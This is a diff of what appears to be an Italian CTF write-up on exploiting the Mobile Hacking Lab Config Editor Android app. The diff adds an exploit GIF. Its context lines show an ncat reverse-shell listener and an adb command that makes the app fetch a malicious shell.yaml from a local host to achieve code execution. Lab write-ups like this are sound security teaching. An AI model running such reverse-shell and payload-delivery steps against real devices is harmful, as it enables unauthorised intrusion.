@@ -144,6 +144,8 @@ ncat -lnvp 1337 # listener for reverse shell
 adb shell am start -a android.intent.action.VIEW -d  "http://192.168.1.26:8081/shell.yaml" -n com.mobilehackinglab.configeditor/.MainActivity # emulate browser interaction
 ```
 
+![Alt Text](assets/exploit.gif)
+
 ## And now?
 
 RCE / ACE su utente Android non ci dà molti privilegi e non possiamo muoverci liberamente nel file system. Quali sono i passi successivi?
